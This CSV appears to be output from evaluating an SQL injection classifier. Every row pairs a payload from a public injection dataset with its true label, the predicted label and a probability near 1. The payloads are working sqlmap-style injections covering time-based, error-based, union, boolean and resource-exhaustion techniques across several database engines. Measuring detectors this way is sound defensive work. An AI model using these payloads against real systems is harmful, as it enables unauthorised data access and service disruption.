text,source,true_label,pred_label,prob_sqli,correct
"1'  )  )   and 8635 =  ( select count ( * )  from generate_series ( 1,5000000  )  )  --",syedsaqlainhussain/sql-injection-dataset/sqliv2.csv,1,1,0.999992847442627,1
"1""  )  )   as ycvh where 4523 = 4523 and sleep ( 5 ) #",syedsaqlainhussain/sql-injection-dataset/sqliv2.csv,1,1,0.9999929666519165,1
"1  )  )   )  or 6979 = like ( 'abcdefg',upper ( hex ( randomblob ( 500000000/2  )  )    )  )  --",syedsaqlainhussain/sql-injection-dataset/sqliv2.csv,1,1,0.9999929666519165,1
"1"" )  where 1144 = 1144 and 2006 = 2006",syedsaqlainhussain/sql-injection-dataset/sqliv2.csv,1,1,0.999992847442627,1
1 where 7038 = 7038,syedsaqlainhussain/sql-injection-dataset/sqliv2.csv,1,1,0.9999895095825195,1
"1%' )  and char ( 120 ) ||char ( 106 ) ||char ( 117 ) ||char ( 85 )  = regexp_substring ( repeat ( right ( char ( 9981 ) ,0 ) ,5000000000 ) ,null )  and  ( '%' = '",syedsaqlainhussain/sql-injection-dataset/sqliv2.csv,1,1,0.9999929666519165,1
"1'  )  )   as qhpv where 7049 = 7049 and make_set ( 8403 = 8403,8899 ) --",syedsaqlainhussain/sql-injection-dataset/sqliv2.csv,1,1,0.9999929666519165,1
"1%"" or 4240 =  ( select 4240 from pg_sleep ( 5  )  )  --",syedsaqlainhussain/sql-injection-dataset/sqliv2.csv,1,1,0.999992847442627,1
"-2106"" or 4493 = utl_inaddr.get_host_address ( chr ( 113 ) ||chr ( 113 ) ||chr ( 112 ) ||chr ( 106 ) ||chr ( 113 ) || ( select  ( case when  ( 4493 = 4493 )  then 1 else 0 end )  from dual ) ||chr ( 113 ) ||chr ( 122 ) ||chr ( 118 ) ||chr ( 122 ) ||chr ( 113  )  )   and ""dvlq"" like ""dvlq",syedsaqlainhussain/sql-injection-dataset/sqliv2.csv,1,1,0.9999929666519165,1
"1%'  )  )   or 1022 =  ( select count ( * )  from all_users t1,all_users t2,all_users t3,all_users t4,all_users t5 ) --",syedsaqlainhussain/sql-injection-dataset/sqliv2.csv,1,1,0.999992847442627,1
"1"" and elt ( 4249 = 4249,7259 )  and ""tmxx"" = ""tmxx",syedsaqlainhussain/sql-injection-dataset/sqliv2.csv,1,1,0.9999929666519165,1
"-9672%""  )  )   )  order by 1#",syedsaqlainhussain/sql-injection-dataset/sqliv2.csv,1,1,0.9999927282333374,1
"-2717"" or 1 group by concat ( 0x7171706a71, ( select  ( case when  ( 4232 = 4232 )  then 1 else 0 end  )  )  ,0x717a767a71,floor ( rand ( 0 ) *2  )  )   having min ( 0 ) #",syedsaqlainhussain/sql-injection-dataset/sqliv2.csv,1,1,0.9999929666519165,1
"-1922%' )  union all select 2335,2335,2335,2335,2335,2335,2335,2335,2335,2335--",syedsaqlainhussain/sql-injection-dataset/sqliv2.csv,1,1,0.9999923706054688,1
"-7306"" or 2081 = 6847",syedsaqlainhussain/sql-injection-dataset/sqliv2.csv,1,1,0.9999922513961792,1
1 and  ( 1977 = 6852 ) *6852-- clxl,syedsaqlainhussain/sql-injection-dataset/sqliv2.csv,1,1,0.999992847442627,1
"select count ( * )  from domain.domains as t1,domain.columns as t2,domain.tables as t3 and   (  (  ""vqpx"" like ""vqpx",syedsaqlainhussain/sql-injection-dataset/sqliv2.csv,1,1,0.9999929666519165,1
"1' )  and 6055 = ctxsys.drithsx.sn ( 6055, ( chr ( 113 ) ||chr ( 113 ) ||chr ( 112 ) ||chr ( 106 ) ||chr ( 113 ) || ( select  ( case when  ( 6055 = 6055 )  then 1 else 0 end )  from dual ) ||chr ( 113 ) ||chr ( 122 ) ||chr ( 118 ) ||chr ( 122 ) ||chr ( 113  )  )   )  and  ( 'rvwk' = 'rvwk",syedsaqlainhussain/sql-injection-dataset/sqliv2.csv,1,1,0.9999929666519165,1
"-9382' )  union all select 4774,4774,4774,4774--",syedsaqlainhussain/sql-injection-dataset/sqliv2.csv,1,1,0.999992847442627,1
-2372' or 1783 = 2656,syedsaqlainhussain/sql-injection-dataset/sqliv2.csv,1,1,0.9999924898147583,1
"1'  )  )   )  or 2367 =  ( select count ( * )  from rdb$fields as t1,rdb$types as t2,rdb$collations as t3,rdb$functions as t4 ) --",syedsaqlainhussain/sql-injection-dataset/sqliv2.csv,1,1,0.999992847442627,1
"1' )  where 6720 = 6720 or 7552 =  ( select count ( * )  from rdb$fields as t1,rdb$types as t2,rdb$collations as t3,rdb$functions as t4 ) --",syedsaqlainhussain/sql-injection-dataset/sqliv2.csv,1,1,0.999992847442627,1
"1'  )  )   or row ( 1045,7562 ) > ( select count ( * ) ,concat ( 0x7171706a71, ( select  ( elt ( 1045 = 1045,1  )  )   ) ,0x717a767a71,floor ( rand ( 0 ) *2  )  )  x from  ( select 8488 union select 5584 union select 3051 union select 1210 ) a group by x )  and   (  (  'mttj' like 'mttj",syedsaqlainhussain/sql-injection-dataset/sqliv2.csv,1,1,0.9999929666519165,1
"1'  )  )   and 6510 =  ( select count ( * )  from sysusers as sys1,sysusers as sys2,sysusers as sys3,sysusers as sys4,sysusers as sys5,sysusers as sys6,sysusers as sys7 )  and   (  (  'vcvj' = 'vcvj",syedsaqlainhussain/sql-injection-dataset/sqliv2.csv,1,1,0.999992847442627,1
1' )  and 2305 = 1934,syedsaqlainhussain/sql-injection-dataset/sqliv2.csv,1,1,0.9999927282333374,1
"1' in boolean mode )  and  ( select 2* ( if  (  (  select * from  ( select concat ( 0x7171706a71, ( select  ( elt ( 3484 = 3484,1  )  )   ) ,0x717a767a71,0x78  )  )  s ) , 8446744073709551610, 8446744073709551610  )  )   ) #",syedsaqlainhussain/sql-injection-dataset/sqliv2.csv,1,1,0.9999929666519165,1
"1'|| ( select 'alxi' where 3967 = 3967 and 2388 = benchmark ( 5000000,md5 ( 0x6d457153  )  )  #",syedsaqlainhussain/sql-injection-dataset/sqliv2.csv,1,1,0.9999929666519165,1
"1'|| ( select 'dpje' where 2704 = 2704 or char ( 75 ) ||char ( 70 ) ||char ( 99 ) ||char ( 83 )  = regexp_substring ( repeat ( left ( crypt_key ( char ( 65 ) ||char ( 69 ) ||char ( 83 ) ,null ) ,0 ) ,500000000 ) ,null ) --",syedsaqlainhussain/sql-injection-dataset/sqliv2.csv,1,1,0.999992847442627,1
"1' )  or 2367 =  ( select count ( * )  from rdb$fields as t1,rdb$types as t2,rdb$collations as t3,rdb$functions as t4 ) --",syedsaqlainhussain/sql-injection-dataset/sqliv2.csv,1,1,0.999992847442627,1
"1%' )  or 8384 = like ( 'abcdefg',upper ( hex ( randomblob ( 500000000/2  )  )    )  )   and  ( '%' = '",syedsaqlainhussain/sql-injection-dataset/sqliv2.csv,1,1,0.999992847442627,1
-6327'  )  )   union all select 2685--,syedsaqlainhussain/sql-injection-dataset/sqliv2.csv,1,1,0.9999927282333374,1
"1  )  )   )  and 8635 =  ( select count ( * )  from generate_series ( 1,5000000  )  )  --",syedsaqlainhussain/sql-injection-dataset/sqliv2.csv,1,1,0.999992847442627,1
"1""  )  )   union all select null--",syedsaqlainhussain/sql-injection-dataset/sqliv2.csv,1,1,0.9999926090240479,1
"1""  )  )   )  or char ( 119 ) ||char ( 100 ) ||char ( 99 ) ||char ( 121 )  = regexp_substring ( repeat ( right ( char ( 1441 ) ,0 ) ,5000000000 ) ,null ) --",syedsaqlainhussain/sql-injection-dataset/sqliv2.csv,1,1,0.9999929666519165,1
1' where 7613 = 7613,syedsaqlainhussain/sql-injection-dataset/sqliv2.csv,1,1,0.9999921321868896,1
"call regexp_substring ( repeat ( right ( char ( 3702 ) ,0 ) ,500000000 ) ,null )  and   (  (   ( 'leps' like 'leps",syedsaqlainhussain/sql-injection-dataset/sqliv2.csv,1,1,0.9999929666519165,1
"1%""  )  )   and 6969 =  ( select 6969 from pg_sleep ( 5  )  )   and   (  (  ""%"" = """,syedsaqlainhussain/sql-injection-dataset/sqliv2.csv,1,1,0.9999927282333374,1
1 )  as zodp where 9112 = 9112,syedsaqlainhussain/sql-injection-dataset/sqliv2.csv,1,1,0.999992847442627,1
"1'+ ( select 'ngdk' where 7264 = 7264 and 3202 = like ( 'abcdefg',upper ( hex ( randomblob ( 500000000/2  )  )    )  )   ) +'",syedsaqlainhussain/sql-injection-dataset/sqliv2.csv,1,1,0.9999929666519165,1
"1"" )  or 8315 =  ( select count ( * )  from sysibm.systables as t1,sysibm.systables as t2,sysibm.systables as t3 )  and  ( ""eeye"" = ""eeye",syedsaqlainhussain/sql-injection-dataset/sqliv2.csv,1,1,0.999992847442627,1
"1' in boolean mode )  or 2633 = dbms_pipe.receive_message ( chr ( 112 ) ||chr ( 65 ) ||chr ( 65 ) ||chr ( 103 ) ,5 ) #",syedsaqlainhussain/sql-injection-dataset/sqliv2.csv,1,1,0.9999927282333374,1
"1""  )  )   )  union all select null#",syedsaqlainhussain/sql-injection-dataset/sqliv2.csv,1,1,0.9999927282333374,1
"1'  )  )   as lxjs where 6503 = 6503 procedure analyse ( extractvalue ( 5840,concat ( 0x5c,0x7171706a71, ( select  ( case when  ( 5840 = 5840 )  then 1 else 0 end  )  )  ,0x717a767a71  )  )  ,1 ) --",syedsaqlainhussain/sql-injection-dataset/sqliv2.csv,1,1,0.9999929666519165,1
1' )  and 3754 =  ( select upper ( xmltype ( chr ( 60 ) ||chr ( 58 ) ||chr ( 113 ) ||chr ( 113 ) ||chr ( 112 ) ||chr ( 106 ) ||chr ( 113 ) || ( select  ( case when  ( 3754 = 3754 )  then 1 else 0 end )  from dual ) ||chr ( 113 ) ||chr ( 122 ) ||chr ( 118 ) ||chr ( 122 ) ||chr ( 113 ) ||chr ( 62  )  )   )  from dual )  and  ( 'ulkq' = 'ulkq,syedsaqlainhussain/sql-injection-dataset/sqliv2.csv,1,1,0.999992847442627,1
"1%' )  or  ( select 2* ( if  (  (  select * from  ( select concat ( 0x7171706a71, ( select  ( elt ( 8113 = 8113,1  )  )   ) ,0x717a767a71,0x78  )  )  s ) , 8446744073709551610, 8446744073709551610  )  )   )  and  ( '%' = '",syedsaqlainhussain/sql-injection-dataset/sqliv2.csv,1,1,0.999992847442627,1
1 rlike  ( select  ( case when  ( 8911 = 5301 )  then 1 else 0x28 end  )  )  # pmuh,syedsaqlainhussain/sql-injection-dataset/sqliv2.csv,1,1,0.999992847442627,1
"select count ( * )  from all_users t1,all_users t2,all_users t3,all_users t4,all_users t5 and   (  (   ( 'juhi' like 'juhi",syedsaqlainhussain/sql-injection-dataset/sqliv2.csv,1,1,0.999992847442627,1
1 and 8398 = 1891-- naov,syedsaqlainhussain/sql-injection-dataset/sqliv2.csv,1,1,0.9999909400939941,1
"1%""  )  )   and  ( select 2* ( if  (  (  select * from  ( select concat ( 0x7171706a71, ( select  ( elt ( 3484 = 3484,1  )  )   ) ,0x717a767a71,0x78  )  )  s ) , 8446744073709551610, 8446744073709551610  )  )   )  and   (  (  ""%"" = """,syedsaqlainhussain/sql-injection-dataset/sqliv2.csv,1,1,0.9999929666519165,1
"1' where 3425 = 3425 and elt ( 4249 = 4249,7259 ) --",syedsaqlainhussain/sql-injection-dataset/sqliv2.csv,1,1,0.9999929666519165,1
"1  )  )   )  union all select null,null,null#",syedsaqlainhussain/sql-injection-dataset/sqliv2.csv,1,1,0.9999926090240479,1
1'+ ( select nxfp where 5006 = 5006,syedsaqlainhussain/sql-injection-dataset/sqliv2.csv,1,1,0.999992847442627,1
"1'|| ( select 'eamo' where 4958 = 4958 and 6537 = dbms_pipe.receive_message ( chr ( 76 ) ||chr ( 116 ) ||chr ( 117 ) ||chr ( 65 ) ,5  )  )  ||'",syedsaqlainhussain/sql-injection-dataset/sqliv2.csv,1,1,0.9999929666519165,1
"1""  )  )   and 5556 =  ( select count ( * )  from all_users t1,all_users t2,all_users t3,all_users t4,all_users t5 )  and   (  (  ""qyew"" = ""qyew",syedsaqlainhussain/sql-injection-dataset/sqliv2.csv,1,1,0.999992847442627,1
1' )  as dqgr where 2427 = 2427 and  ( 3020 = 3020 ) *6703--,syedsaqlainhussain/sql-injection-dataset/sqliv2.csv,1,1,0.9999929666519165,1
1'|| ( select 'uedy' where 8816 = 8816,syedsaqlainhussain/sql-injection-dataset/sqliv2.csv,1,1,0.9999927282333374,1
"1'  )  )   as ylyq where 2953 = 2953 and 2716 =  ( select count ( * )  from sysusers as sys1,sysusers as sys2,sysusers as sys3,sysusers as sys4,sysusers as sys5,sysusers as sys6,sysusers as sys7 ) --",syedsaqlainhussain/sql-injection-dataset/sqliv2.csv,1,1,0.999992847442627,1
1 where 4372 = 4372,syedsaqlainhussain/sql-injection-dataset/sqliv2.csv,1,1,0.9999899864196777,1
"-9166"" )  as hlre where 4768 = 4768 or 5903 =  ( 'qqpjq'|| ( select case 5903 when 5903 then 1 else 0 end from rdb$database ) ||'qzvzq' ) --",syedsaqlainhussain/sql-injection-dataset/sqliv2.csv,1,1,0.9999929666519165,1
"-1256' in boolean mode )  union all select 7889,7889,7889,7889,7889,7889,7889,7889,7889--",syedsaqlainhussain/sql-injection-dataset/sqliv2.csv,1,1,0.999992847442627,1
"1' or 5286 =  ( select count ( * )  from all_users t1,all_users t2,all_users t3,all_users t4,all_users t5 )",syedsaqlainhussain/sql-injection-dataset/sqliv2.csv,1,1,0.9999926090240479,1
"1"" and  ( 3020 = 3020 ) *6703 and ""tnzp"" like ""tnzp",syedsaqlainhussain/sql-injection-dataset/sqliv2.csv,1,1,0.9999929666519165,1
-4965 )  as imga where 3705 = 3705 union all select 3705--,syedsaqlainhussain/sql-injection-dataset/sqliv2.csv,1,1,0.999992847442627,1
select  ( case when  ( 8208 = 7960 )  then 8208 else 8208* ( select 8208 from information_schema.character_sets )  end ) #,syedsaqlainhussain/sql-injection-dataset/sqliv2.csv,1,1,0.9999927282333374,1
"-4210"" )  where 2679 = 2679 or 4493 = utl_inaddr.get_host_address ( chr ( 113 ) ||chr ( 113 ) ||chr ( 112 ) ||chr ( 106 ) ||chr ( 113 ) || ( select  ( case when  ( 4493 = 4493 )  then 1 else 0 end )  from dual ) ||chr ( 113 ) ||chr ( 122 ) ||chr ( 118 ) ||chr ( 122 ) ||chr ( 113  )  )  --",syedsaqlainhussain/sql-injection-dataset/sqliv2.csv,1,1,0.9999929666519165,1
"1"" )  and  ( 4085 = 4885 ) *4885 and  ( ""sxte"" = ""sxte",syedsaqlainhussain/sql-injection-dataset/sqliv2.csv,1,1,0.9999929666519165,1
"1'  )  )   )  and 3580 =  ( select count ( * )  from domain.domains as t1,domain.columns as t2,domain.tables as t3 ) --",syedsaqlainhussain/sql-injection-dataset/sqliv2.csv,1,1,0.9999927282333374,1
"1%""  )  )   )  and 2388 = benchmark ( 5000000,md5 ( 0x6d457153  )  )  #",syedsaqlainhussain/sql-injection-dataset/sqliv2.csv,1,1,0.9999929666519165,1
"1'  )  )   as fusi where 2788 = 2788 or 8514 = benchmark ( 5000000,md5 ( 0x544d5a4c  )  )  #",syedsaqlainhussain/sql-injection-dataset/sqliv2.csv,1,1,0.9999929666519165,1
"-9947""  )  )   )  union all select 8765,8765,8765,8765,8765#",syedsaqlainhussain/sql-injection-dataset/sqliv2.csv,1,1,0.9999929666519165,1
1 )  as phja where 4627 = 4627,syedsaqlainhussain/sql-injection-dataset/sqliv2.csv,1,1,0.9999927282333374,1
"1""  )  )   as gqxk where 9199 = 9199 and 3754 =  ( select upper ( xmltype ( chr ( 60 ) ||chr ( 58 ) ||chr ( 113 ) ||chr ( 113 ) ||chr ( 112 ) ||chr ( 106 ) ||chr ( 113 ) || ( select  ( case when  ( 3754 = 3754 )  then 1 else 0 end )  from dual ) ||chr ( 113 ) ||chr ( 122 ) ||chr ( 118 ) ||chr ( 122 ) ||chr ( 113 ) ||chr ( 62  )  )   )  from dual ) --",syedsaqlainhussain/sql-injection-dataset/sqliv2.csv,1,1,0.999992847442627,1
1%' )  order by 1#,syedsaqlainhussain/sql-injection-dataset/sqliv2.csv,1,1,0.9999927282333374,1
1'  )  )   rlike sleep ( 5 ) #,syedsaqlainhussain/sql-injection-dataset/sqliv2.csv,1,1,0.9999927282333374,1
"1 or  ( select 2* ( if  (  (  select * from  ( select concat ( 0x7171706a71, ( select  ( elt ( 8113 = 8113,1  )  )   ) ,0x717a767a71,0x78  )  )  s ) , 8446744073709551610, 8446744073709551610  )  )   )",syedsaqlainhussain/sql-injection-dataset/sqliv2.csv,1,1,0.999992847442627,1
"1  )  )   ( select  ( case when  ( 4587 = 4587 )  then regexp_substring ( repeat ( left ( crypt_key ( char ( 65 ) ||char ( 69 ) ||char ( 83 ) ,null ) ,0 ) ,500000000 ) ,null )  else char ( 76 ) ||char ( 65 ) ||char ( 102 ) ||char ( 72 )  end )  from  ( values ( 0  )  )   )  and   (  (  1402 = 1402",syedsaqlainhussain/sql-injection-dataset/sqliv2.csv,1,1,0.999992847442627,1
1'  )  )   rlike  ( select  ( case when  ( 7689 = 7689 )  then 1 else 0x28 end  )  )   and   (  (  'trzi' = 'trzi,syedsaqlainhussain/sql-injection-dataset/sqliv2.csv,1,1,0.999992847442627,1
"1""  )  )   and 6414 =  ( select count ( * )  from rdb$fields as t1,rdb$types as t2,rdb$collations as t3,rdb$functions as t4 )  and   (  (  ""uzbl"" = ""uzbl",syedsaqlainhussain/sql-injection-dataset/sqliv2.csv,1,1,0.999992847442627,1
"select count ( * )  from rdb$fields as t1,rdb$types as t2,rdb$collations as t3,rdb$functions as t4 and  ( ""gzhp"" = ""gzhp",syedsaqlainhussain/sql-injection-dataset/sqliv2.csv,1,1,0.9999929666519165,1
select  ( case when  ( 3859 = 6938 )  then 3859 else 3859* ( select 3859 from mysql.db )  end ) #,syedsaqlainhussain/sql-injection-dataset/sqliv2.csv,1,1,0.999992847442627,1
-7277  )  )   )  order by 1#,syedsaqlainhussain/sql-injection-dataset/sqliv2.csv,1,1,0.9999927282333374,1
"1 )  where 2888 = 2888 or 8156 =  ( select count ( * )  from generate_series ( 1,5000000  )  )  --",syedsaqlainhussain/sql-injection-dataset/sqliv2.csv,1,1,0.999992847442627,1
1'  )  )   ),syedsaqlainhussain/sql-injection-dataset/sqliv2.csv,1,1,0.9999927282333374,1
"1 or 2633 = dbms_pipe.receive_message ( chr ( 112 ) ||chr ( 65 ) ||chr ( 65 ) ||chr ( 103 ) ,5 ) # tsxs",syedsaqlainhussain/sql-injection-dataset/sqliv2.csv,1,1,0.9999909400939941,1
"1%""  )  )   and elt ( 3114 = 3114,sleep ( 5  )  )  #",syedsaqlainhussain/sql-injection-dataset/sqliv2.csv,1,1,0.9999929666519165,1
"1%"" or exp ( ~ ( select * from  ( select concat ( 0x7171706a71, ( select  ( elt ( 6270 = 6270,1  )  )   ) ,0x717a767a71,0x78  )  )  x  )  )   and ""%"" = """,syedsaqlainhussain/sql-injection-dataset/sqliv2.csv,1,1,0.9999929666519165,1
1'|| ( select 'yezk' where 2097 = 2097,syedsaqlainhussain/sql-injection-dataset/sqliv2.csv,1,1,0.9999926090240479,1
end ) ||',syedsaqlainhussain/sql-injection-dataset/sqliv2.csv,1,1,0.9999902248382568,1
"1'  )  )   as fwxq where 9935 = 9935 or exp ( ~ ( select * from  ( select concat ( 0x7171706a71, ( select  ( elt ( 6270 = 6270,1  )  )   ) ,0x717a767a71,0x78  )  )  x  )  )  --",syedsaqlainhussain/sql-injection-dataset/sqliv2.csv,1,1,0.9999929666519165,1
"1"" )  and elt ( 1210 = 1210,sleep ( 5  )  )   and  ( ""cwwv"" like ""cwwv",syedsaqlainhussain/sql-injection-dataset/sqliv2.csv,1,1,0.999992847442627,1
-2036' )  or  ( 8459 = 8459 ) *4906 and  ( 'hjeu' = 'hjeu,syedsaqlainhussain/sql-injection-dataset/sqliv2.csv,1,1,0.9999929666519165,1
1'+ ( select hett where 7228 = 7228,syedsaqlainhussain/sql-injection-dataset/sqliv2.csv,1,1,0.9999926090240479,1
"1%"" )  procedure analyse ( extractvalue ( 9255,concat ( 0x5c, ( benchmark ( 5000000,md5 ( 0x52515a50  )  )    )  )   ) ,1 )  and  ( ""%"" = """,syedsaqlainhussain/sql-injection-dataset/sqliv2.csv,1,1,0.999992847442627,1
"1'|| ( select 'jzwq' where 3289 = 3289 union all select null,null,null,null,null,null,null#",syedsaqlainhussain/sql-injection-dataset/sqliv2.csv,1,1,0.9999927282333374,1
"1%'  )  )   )  and 6537 = dbms_pipe.receive_message ( chr ( 76 ) ||chr ( 116 ) ||chr ( 117 ) ||chr ( 65 ) ,5 )  and   (  (   ( '%' = '",syedsaqlainhussain/sql-injection-dataset/sqliv2.csv,1,1,0.9999929666519165,1
"-5617 )  where 2132 = 2132 union all select 2132,2132,2132,2132#",syedsaqlainhussain/sql-injection-dataset/sqliv2.csv,1,1,0.999992847442627,1
"1 )  procedure analyse ( extractvalue ( 5840,concat ( 0x5c,0x7171706a71, ( select  ( case when  ( 5840 = 5840 )  then 1 else 0 end  )  )  ,0x717a767a71  )  )  ,1 )  and  ( 6986 = 6986",syedsaqlainhussain/sql-injection-dataset/sqliv2.csv,1,1,0.9999929666519165,1
1' )  and 2853 = cast  (  (  chr ( 113 ) ||chr ( 113 ) ||chr ( 112 ) ||chr ( 106 ) ||chr ( 113  )  )  || ( select  ( case when  ( 2853 = 2853 )  then 1 else 0 end  )  )  ::text|| ( chr ( 113 ) ||chr ( 122 ) ||chr ( 118 ) ||chr ( 122 ) ||chr ( 113  )  )   as numeric )  and  ( 'xazf' = 'xazf,syedsaqlainhussain/sql-injection-dataset/sqliv2.csv,1,1,0.9999929666519165,1
"1"" )  as hymr where 5497 = 5497 union all select null,null,null,null--",syedsaqlainhussain/sql-injection-dataset/sqliv2.csv,1,1,0.9999927282333374,1
"1  )  )   )  or 4915 =  ( select count ( * )  from domain.domains as t1,domain.columns as t2,domain.tables as t3 ) --",syedsaqlainhussain/sql-injection-dataset/sqliv2.csv,1,1,0.9999927282333374,1
1 )  or 4240 =  ( select 4240 from pg_sleep ( 5  )  )  --,syedsaqlainhussain/sql-injection-dataset/sqliv2.csv,1,1,0.999992847442627,1
"1' )  or updatexml ( 1808,concat ( 0x2e,0x7171706a71, ( select  ( elt ( 1808 = 1808,1  )  )   ) ,0x717a767a71 ) ,8666 )  and  ( 'iifh' = 'iifh",syedsaqlainhussain/sql-injection-dataset/sqliv2.csv,1,1,0.9999929666519165,1
"1 )  and 6510 =  ( select count ( * )  from sysusers as sys1,sysusers as sys2,sysusers as sys3,sysusers as sys4,sysusers as sys5,sysusers as sys6,sysusers as sys7 )  and  ( 9841 = 9841",syedsaqlainhussain/sql-injection-dataset/sqliv2.csv,1,1,0.999992847442627,1
-9562' or 8571 = 8571--,syedsaqlainhussain/sql-injection-dataset/sqliv2.csv,1,1,0.9999927282333374,1
1' )  and  ( select * from  ( select ( sleep ( 5  )  )   ) fzno )  and  ( 'mqoj' like 'mqoj,syedsaqlainhussain/sql-injection-dataset/sqliv2.csv,1,1,0.9999927282333374,1
1 )  where 4992 = 4992,syedsaqlainhussain/sql-injection-dataset/sqliv2.csv,1,1,0.9999926090240479,1
"1%""  )  )   and 2853 = cast  (  (  chr ( 113 ) ||chr ( 113 ) ||chr ( 112 ) ||chr ( 106 ) ||chr ( 113  )  )  || ( select  ( case when  ( 2853 = 2853 )  then 1 else 0 end  )  )  ::text|| ( chr ( 113 ) ||chr ( 122 ) ||chr ( 118 ) ||chr ( 122 ) ||chr ( 113  )  )   as numeric )  and   (  (  ""%"" = """,syedsaqlainhussain/sql-injection-dataset/sqliv2.csv,1,1,0.999992847442627,1
"-8677'|| ( select 'ihpm' from dual where 9571 = 9571 union all select 9571,9571,9571,9571,9571,9571,9571,9571,9571,9571--",syedsaqlainhussain/sql-injection-dataset/sqliv2.csv,1,1,0.9999926090240479,1
"1%""  )  )   )  or char ( 75 ) ||char ( 70 ) ||char ( 99 ) ||char ( 83 )  = regexp_substring ( repeat ( left ( crypt_key ( char ( 65 ) ||char ( 69 ) ||char ( 83 ) ,null ) ,0 ) ,500000000 ) ,null ) --",syedsaqlainhussain/sql-injection-dataset/sqliv2.csv,1,1,0.9999927282333374,1
"-2790%"" )  union all select 5070,5070#",syedsaqlainhussain/sql-injection-dataset/sqliv2.csv,1,1,0.999992847442627,1
1'|| ( select 'vpuh' where 8164 = 8164,syedsaqlainhussain/sql-injection-dataset/sqliv2.csv,1,1,0.9999927282333374,1
"call regexp_substring ( repeat ( right ( char ( 3702 ) ,0 ) ,500000000 ) ,null  )  )  +'",syedsaqlainhussain/sql-injection-dataset/sqliv2.csv,1,1,0.9999929666519165,1
